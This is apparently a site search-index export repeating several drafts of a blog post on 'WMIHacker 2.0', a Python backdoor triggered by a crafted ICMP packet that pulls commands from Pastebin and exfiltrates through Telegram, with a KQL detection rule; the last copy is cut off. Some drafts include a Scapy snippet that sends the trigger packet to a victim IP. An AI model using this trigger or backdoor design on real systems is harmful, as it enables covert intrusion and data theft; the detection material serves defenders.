[{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\n![WMIHACKER CHAIN](/chain_wmihacker.png) The attack chain might look this way: 1. Initial access on a client machine via spear-phishing (T1566.001). 2. That machine sends a specially crafted packet to an internal Exchange server (already compromised). 3. The Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047). 4. Collected data is sent to a completely separate, hidden C2 server. As I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. ## Detection \u0026amp; Response \u0026gt;Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026#39;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise. To detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used: `winlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026#34;S-1-5-20\u0026#34;` Explanation: - event.code: 4688 â€“ Triggers on the creation of a new process. - winlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution. - SubjectUserSid: \u0026#34;S-1-5-20\u0026#34; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts. Response Actions: - Investigate the child process and command-line arguments. - Review associated WMI event logs and consumer/subscription configurations. - Correlate with other telemetry such as network connections or abnormal service creation. - Apply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors. ## Conclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts. When integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks. ","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\nvictim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) The attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\nvictim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to 